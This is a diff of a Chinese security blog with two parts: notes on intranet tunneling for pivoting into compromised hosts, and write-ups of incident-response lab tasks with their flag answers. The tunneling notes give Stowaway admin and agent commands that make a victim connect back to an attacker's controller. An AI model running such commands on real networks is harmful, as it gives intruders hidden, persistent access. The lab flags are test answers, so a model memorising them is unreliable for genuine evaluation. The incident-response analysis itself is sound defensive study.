+<h4 id="系列点：-4"><a href="#系列点：-4" class="headerlink" title="#系列点："></a>#系列点：</h4><p>1、判断什么时候用代理</p>
+<p>2、判断什么时候用隧道</p>
+<p>3、判断出网和不出网协议</p>
+<p>4、如何使用代理建立节点并连接</p>
+<p>5、如何使用隧道技术封装协议上线</p>
+<p>6、判断哪些代理或隧道情况选择放弃</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/3d6e827033023f8a4d370bc1daaf216a--0495--image-20240511092308716.png" alt="image-20240511092308716"></p>
+<h4 id="演示案例：-56"><a href="#演示案例：-56" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 内网穿透-Ngrok-入门-上线</p>
+<p> 内网穿透-Frp-简易型-上线</p>
+<p> 内网穿透-Nps-自定义-上线</p>
+<p> 内网穿透-Spp-特殊协议-上线</p>
+<p>旨在代理连接肉鸡后实现本地渗透肉鸡网络架构</p>
+<p>Linux：Proxychains</p>
+<p>Windows：Sockscap Proxifier</p>
+<p>穿透项目：Ngrok Frp Spp Nps EW(停更)</p>
+<p>优点：穿透加密数据，中间平台，防追踪，解决网络问题</p>
+<p><a href="https://www.ngrok.cc/">https://www.ngrok.cc</a></p>
+<p><a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></p>
+<p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
+<p><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p>
+<p><a href="http://www.rootkiter.com/EarthWorm">http://www.rootkiter.com/EarthWorm</a></p>
+<p>内网穿透的隧道搭建有很多，这里就主要讲讲我使用的工具stowaway</p>
+<p><a href="https://blog.csdn.net/qq_44159028/article/details/129681017">https://blog.csdn.net/qq_44159028/article/details/129681017</a>   参考链接</p>
+<p>1、控制端配置</p>
+<p>上传控制端到kali，使用被动模式，监听端口8000，并对通信进行加密秘钥为123。等待被控端的连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./linux_x64_admin -l 192.168.125.134:8000 -s 123</span><br></pre></td></tr></table></figure>
+
+<p> #或者不指定ip默认监听0.0.0.0</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./linux_x64_admin -l 8000 -s 123</span><br></pre></td></tr></table></figure>
+
+<p>2、被控端配置</p>
+<p>在win2012-1上执行，使用秘钥123连接控制端8000端口，并设置重连间隔时间，当控制端掉线时客户端每隔8s重连控制端</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows_x64_agent.exe -c 192.168.125.134:8000 -s 123 --reconnect 8</span><br></pre></td></tr></table></figure>
+
+<p>然后就是在admin端去创建socks即可</p>
+<h1 id="第128天：内网安全-横向移动-IPC-AT-SC命令-Impacket套件-CS插件-全自动"><a href="#第128天：内网安全-横向移动-IPC-AT-SC命令-Impacket套件-CS插件-全自动" class="headerlink" title="第128天：内网安全-横向移动&amp;IPC&amp;AT&amp;SC命令&amp;Impacket套件&amp;CS插件&amp;全自动"></a>第128天：内网安全-横向移动&amp;IPC&amp;AT&amp;SC命令&amp;Impacket套件&amp;CS插件&amp;全自动</h1>]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>应急响应</title>
+    <url>/2024/06/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
+    <content><![CDATA[<p>最近有一个应急响应的靶场，玄机应急响应，所以也就去研究研究应急响应相关的知识。</p>
+<span id="more"></span>
+
+<h1 id="第一章-应急响应"><a href="#第一章-应急响应" class="headerlink" title="第一章-应急响应"></a>第一章-应急响应</h1><h2 id="Linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a>Linux日志分析</h2><p><a href="https://blog.csdn.net/qq_50765147/article/details/135878715">https://blog.csdn.net/qq_50765147/article/details/135878715</a>  相关资料链接</p>
+<p>首先就是进入题目，ssh连接后，我们可以尝试去读取一下Linux日志文件</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/3a0d9c411882c5bc7705afad91b22bb5--6149--image-20240603210232034.png" alt="image-20240603210232034"></p>
+<h4 id="任务一"><a href="#任务一" class="headerlink" title="任务一"></a>任务一</h4><p>第一个任务就是有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割 小到大排序 例如flag{192.168.200.1,192.168.200.2}</p>
+<p>第一个 Flag 的目标是查找爆破 SSH 服务 Root 账户的 IP，故这里我们需要分析 auth 日志，auth 日志常见于 Debian 系（这台靶机就是 Debian）</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/d28b0f9e7667d37d50f5622699501adf--f84c--4-1715845855.jpeg" alt="4-1715845855"></p>
+<p>这里 auth 日志有两条，分别是<code>auth.log</code>和<code>auth.log.1</code>，我们的判断基础是这两个文件，其次这里我们需要判断出哪些爆破的是 Root 账号，所以需要搜索 “Failed password for root”</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拓展：</span><br><span class="line">.1 表示较早的日志文件，而没有 .1 的文件是当前的日志文件</span><br></pre></td></tr></table></figure>
+
+<p>使用grep去进行查找</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Failed password for root&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/74b48a05cdfb4800616bc807fbcb31d2--d076--image-20240603210808371.png" alt="image-20240603210808371"></p>
+<p>使用awk进行ip提取</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| awk &#x27;&#123;print $11&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>使用sort排序，使用unip -c 进行去重，使用sort -nr进行降序排序</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/62ed66c571e83333a1943dd791734695--300b--image-20240603211111911.png" alt="image-20240603211111911"></p>
+<p>成功获取</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4 192.168.200.2</span><br><span class="line">1 192.168.200.32</span><br><span class="line">1 192.168.200.31</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2,192.168.200.31,192.168.200.32&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务二"><a href="#任务二" class="headerlink" title="任务二"></a>任务二</h4><p>2.ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/1abf55deb21c8f1fe461ea49fd144171--5b7b--image-20240603211809586.png" alt="image-20240603211809586"></p>
+<p>这里成功找到登录成功会有Accepted出现，我们按上面做的那样即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Accepted&quot; | awk &#x27;&#123;print $11&#125;&#x27; | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 192.168.200.2</span><br><span class="line">1 221.130.58.74</span><br></pre></td></tr></table></figure>
+
+<p>这里要注意的是，221开头的ip是我们本机登录的ip，所以应该剔除掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务三"><a href="#任务三" class="headerlink" title="任务三"></a>任务三</h4><p>3.爆破用户名字典是什么？如果有多个使用”,”分割</p>
+<p>直接还是提取</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/166eefc9427d7cc88c7dce4e154b5ef1--0ad4--image-20240603213108197.png" alt="image-20240603213108197"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Failed password&quot; | perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;| uniq -c | sort -nr</span><br></pre></td></tr></table></figure>
+
+<p>这里就可以直接拿到字典了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;user,hello,root,test3,test2,test1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里涉及到一个perl语言</p>
+<h4 id="任务四"><a href="#任务四" class="headerlink" title="任务四"></a>任务四</h4><p>4.成功登录 root 用户的 ip 一共爆破了多少次</p>
+<p>其实第一问的时候已经看到了的</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/e47bb3e3102e99f799387197b0fc70b1--0f87--image-20240603214219501.png" alt="image-20240603214219501"></p>
+<p>直接出就行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Failed password&quot; | awk &#x27;&#123;if($11==&quot;192.168.200.2&quot;) print $11&#125;&#x27;|sort|uniq -c</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务5"><a href="#任务5" class="headerlink" title="任务5"></a>任务5</h4><p>5.黑客登陆主机后新建了一个后门用户，用户名是多少</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/5b59259fb061754a82bc6ef3f20df148--5c64--image-20240603214722593.png" alt="image-20240603214722593"></p>
+<p>在这个地方注意，黑客添加了test2这个用户作为后门</p>
+<p>这里有一点要注意，后边有个debian用户的创建，这个是我们ssh连接的用户，不是黑客创建的</p>
+<h2 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h2><h4 id="任务一-1"><a href="#任务一-1" class="headerlink" title="任务一"></a>任务一</h4><p>黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</p>
+<p>直接用d盾或者火绒即可</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/7f34907dd43c478bf4b991a92418db09--7a2e--image-20240603234947461.png" alt="image-20240603234947461"></p>
+<p>直接就是找到是gz.php</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/24f58c7eca7ca7fc6e83f75d013ef857--cdde--image-20240603235135992.png" alt="image-20240603235135992"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务二-1"><a href="#任务二-1" class="headerlink" title="任务二"></a>任务二</h4><p>黑客使用的什么工具的shell github地址的md5 flag{md5}</p>
+<p>直接搜索</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/3178fa94b8a77dfdb2ffde23fc26ea95--8adb--image-20240603235243396.png" alt="image-20240603235243396"></p>
+<p>发现是哥斯拉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;39392de3218c333f794befef07ac9257&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务三-1"><a href="#任务三-1" class="headerlink" title="任务三"></a>任务三</h4><p>黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</p>
+<p>还是上面d盾也显示出来了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;aebac0e58cd6c5fad1695ee4d1ac1919&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务四-1"><a href="#任务四-1" class="headerlink" title="任务四"></a>任务四</h4><p>4.黑客免杀马完整路径 md5 flag{md5}</p>
+<p>还是一样的，之前都直接d盾扫出来了的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;eeff2eabfd9b7a6d26fc1a53d3f7d1de&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后这总结一下，D盾真是好好用！！！！！！！！！！！！！！！！！</p>
+<p>这里记录一下一些常见的webshell查杀工具</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1。阿里伏魔</span><br><span class="line">https://ti.aliyun.com/#/webshell</span><br><span class="line">2、百度 WEBDIR+</span><br><span class="line">https://scanner.baidu.com/#/pages/intro</span><br><span class="line">3、河马</span><br><span class="line">https://n.shellpub.com/</span><br><span class="line">4、CloudWalker(牧云)</span><br><span class="line">https://stack.chaitin.com/security-challenge/webshell</span><br><span class="line">5、在线 webshell 查杀-灭绝师太版</span><br><span class="line">http://tools.bugscaner.com/killwebshell/</span><br><span class="line">6、WebShell Detector WebShell 扫描检测器</span><br><span class="line">http://www.shelldetector.com/</span><br><span class="line">7、D 盾</span><br><span class="line">http://www.d99net.net</span><br><span class="line">8、微步</span><br><span class="line">https://threatbook.cn/next/product/sandbox</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux入侵排查"><a href="#Linux入侵排查" class="headerlink" title="Linux入侵排查"></a>Linux入侵排查</h2><h4 id="任务一-2"><a href="#任务一-2" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.web目录存在木马，请找到木马的密码提交</span><br></pre></td></tr></table></figure>
+
+<p>直接就是丢d盾里去就是</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/756f0698f82fc286b735a6cd1d541f56--e870--image-20240604143457279.png" alt="image-20240604143457279"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;1&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务二-2"><a href="#任务二-2" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器疑似存在不死马，请找到不死马的密码提交</span><br></pre></td></tr></table></figure>
+
+<p>直接就是.shell.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;hello&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务三-2"><a href="#任务三-2" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不死马是通过哪个文件生成的，请提交文件名</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/575e977540b418a47bd0f108845a391f--3128--image-20240604143824876.png" alt="image-20240604143824876"></p>
+<p>很明显就能找到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;index.php&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务四-2"><a href="#任务四-2" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客留下了木马文件，请找出黑客的服务器ip提交</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;10.11.55.21&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务五"><a href="#任务五" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客留下了木马文件，请找出黑客服务器开启的监端口提交</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;3333&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里直接两个一起做就行，我们发现在网页目录下有个shell.elf木马文件，我们可以直接去运行它，然后再去查看netstat即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令详解：</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/46b380015231d41b240008156e3e0547--bbc4--image-20240604165924985.png" alt="image-20240604165924985"></p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/c030043dac3b057b133fd28fb55889e4--7864--image-20240604144504373.png" alt="image-20240604144504373"></p>
+<h1 id="第二章-日志分析"><a href="#第二章-日志分析" class="headerlink" title="第二章-日志分析"></a>第二章-日志分析</h1><h2 id="apache日志分析"><a href="#apache日志分析" class="headerlink" title="apache日志分析"></a>apache日志分析</h2><h4 id="任务一-3"><a href="#任务一-3" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、提交当天访问次数最多的IP，即黑客IP：</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log access.log.1 | grep -a &quot;03/Aug&quot; | awk &#x27;&#123;print $1&#125;&#x27; | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/84d28fd8c5a98ca0d89ec8784038dd6e--38ff--image-20240604150902123.png" alt="image-20240604150902123"></p>
+<p>直接找就行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务二-3"><a href="#任务二-3" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客使用的浏览器指纹是什么，提交指纹的md5：</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/fcad17feb5fa9f587876e73751cf967b--3ce9--image-20240604151216742.png" alt="image-20240604151216742"></p>
+<p>发现浏览器指纹就是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2d6330f380f44ac20f3a02eed0958f66&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务三-3"><a href="#任务三-3" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log access.log.1 | grep -a &quot;/index.php&quot; | awk &#x27;&#123;print $1&#125;&#x27; |uniq -c</span><br></pre></td></tr></table></figure>
+
+<p>就是27次</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;27&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务四-3"><a href="#任务四-3" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看黑客IP访问了多少次，提交次数：</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log access.log.1 | grep -a &quot;192.168.200.2 - -&quot; |awk &#x27;&#123;print $1&#125;&#x27;|uniq -c</span><br></pre></td></tr></table></figure>
+
+<p>直接抓ip就行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;6555&#125;</span><br></pre></td></tr></table></figure>
+
+<p>任务五</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log access.log.1 | grep -a &quot;03/Aug/2023:08:&quot; |awk &#x27;&#123;print $1&#125;&#x27;|sort | uniq -c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/412f4b8562c37d19218dfc4c0c839e92--9f50--image-20240604152206000.png" alt="image-20240604152206000"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5&#125;     5个ip</span><br></pre></td></tr></table></figure>
+
+<h2 id="mysql应急响应"><a href="#mysql应急响应" class="headerlink" title="mysql应急响应"></a>mysql应急响应</h2><h4 id="任务一-4"><a href="#任务一-4" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.黑客第一次写入的shell flag&#123;关键字符串&#125; </span><br></pre></td></tr></table></figure>
+
+<p>直接就是d盾扫描即可</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/c9e4ca70d5f748e2e078c2f37a43ff69--eec0--image-20240604162746569.png" alt="image-20240604162746569"></p>
+<p>然后就找到了，在sh.php中</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/0a2bcff864b56870d0d10744161376f9--3b8c--image-20240604162812922.png" alt="image-20240604162812922"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ccfda79e-7aa1-4275-bc26-a6189eb9a20b&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务二-4"><a href="#任务二-4" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.黑客反弹shell的ip flag&#123;ip&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接去查看mysql的日志去分析   &#x2F;var&#x2F;log&#x2F;mysql&#x2F;</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/5c0faa16d71af08b1b7075b0f32cd94d--f10c--image-20240604163143457.png" alt="image-20240604163143457"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务三-4"><a href="#任务三-4" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.黑客提权文件的完整路径 md5 flag&#123;md5&#125; 注 /xxx/xxx/xxx/xxx/xxx.xx</span><br></pre></td></tr></table></figure>
+
+<p>还是之前的mysql日志，我们发现有一个敏感文件1.sh</p>
+<p>我们尝试去找一下</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/302186179a7c28099e8e27a12fb462f0--cbc5--image-20240604163448110.png" alt="image-20240604163448110"></p>
+<p>发现有两个，这一个就是反弹shell的</p>
+<p>——到这里好像啥都没用</p>
+<p>这里就应该去想一下我们应该是怎么攻击的，发现在 &#x2F;var&#x2F;www&#x2F;html 目录下存在一个 common.php 文件，那么黑客应该是通过对网站进行目录探测的时候发现了此文件，恰好此文件还泄露了数据库的账号和密码，那么他的常规操作肯定是远程连接上了数据库后再从数据库作为切入点进行提权，mysql 的常见提权方式就是 UDF 提权<br>然后再根据UDF提权的特性</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UDF 提权肯定会在 /usr/lib/mysql/plugin/ 路径下留下攻击痕迹</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/2f4d33594702d01d1229dbae670548ef--2e6b--image-20240604163947174.png" alt="image-20240604163947174"></p>
+<p>成功知道路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/lib/mysql/plugin/udf.so</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;b1818bde4e310f3d23f1005185b973e7&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务四-4"><a href="#任务四-4" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.黑客获取的权限 flag&#123;whoami后的值&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接查看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -aux</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令详解：</span><br><span class="line">ps      查看进程状态</span><br><span class="line">-a      显示所有用户的所有进程</span><br><span class="line">-u      以一种面向用户的格式显示进程信息，包括用户 ID、CPU 使用率、内存使用率、命令名等。</span><br><span class="line">-x      让 ps 命令显示没有控制终端的进程。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/b98b564106ffc9a6e9fe7ca1f03d1408--e482--image-20240604164233769.png" alt="image-20240604164233769"></p>
+<p>可以看到是mysql权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;mysql&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="redis应急响应"><a href="#redis应急响应" class="headerlink" title="redis应急响应"></a>redis应急响应</h2><h4 id="任务一-5"><a href="#任务一-5" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</span><br></pre></td></tr></table></figure>
+
+<p>直接看日志，很容易就能发现一个ip多次出现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.100.13出现次数较多明显是爆破</span><br><span class="line">192.168.100.20是主从复制</span><br><span class="line">flag&#123;192.168.100.20&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务二-5"><a href="#任务二-5" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/c73a16a79b0212101d70f42dc5c69d6f--401e--image-20240605162903006.png" alt="image-20240605162903006"></p>
+<p>发现对应的恶意文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./exp.so</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务三-5"><a href="#任务三-5" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l      查看定时任务</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/5efbd4ab8dc5c4e2b077d0bc1ae5824f--b680--image-20240605163346550.png" alt="image-20240605163346550"></p>
+<p>直接就能发现flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务四-5"><a href="#任务四-5" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag&#123;黑客的用户-关键字符串&#125; 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交</span><br></pre></td></tr></table></figure>
+
+<p>ssh账号登录需要写入ssh公钥，我们直接去root下的.ssh中查看一下是否有对应文件，发现是有的</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/2cd8c6262cf5e480606f5460e207fc4b--d0aa--image-20240605163742918.png" alt="image-20240605163742918"></p>
+<p>直接去读取一下，就拿到了用户名，使用用户名去github上搜索一下，就能找到flag所需的后一半</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;xj-test-user-wow-you-find-flag&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/9cb990d3bd9c94928b077bb35d247f7d--b3de--image-20240605164129010.png" alt="image-20240605164129010"></p>
+<h4 id="任务五-1"><a href="#任务五-1" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;</span><br></pre></td></tr></table></figure>
+
+<p>我们直接去查看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/bin</span><br><span class="line">ls -al</span><br></pre></td></tr></table></figure>
+
+<p>然后我们发现ps命令被修改，直接去读取发现flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;c195i2923381905517d818e313792d196&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="第三章-权限维持"><a href="#第三章-权限维持" class="headerlink" title="第三章-权限维持"></a>第三章-权限维持</h1><h2 id="linux权限维持-隐藏"><a href="#linux权限维持-隐藏" class="headerlink" title="linux权限维持-隐藏"></a>linux权限维持-隐藏</h2><h4 id="任务一-6"><a href="#任务一-6" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客隐藏的隐藏的文件 完整路径md5</span><br></pre></td></tr></table></figure>
+
+<p>在&#x2F;tmp&#x2F;.temp&#x2F;文件夹下发现libprocesshider,libprocesshider是用于隐藏文件的项目</p>
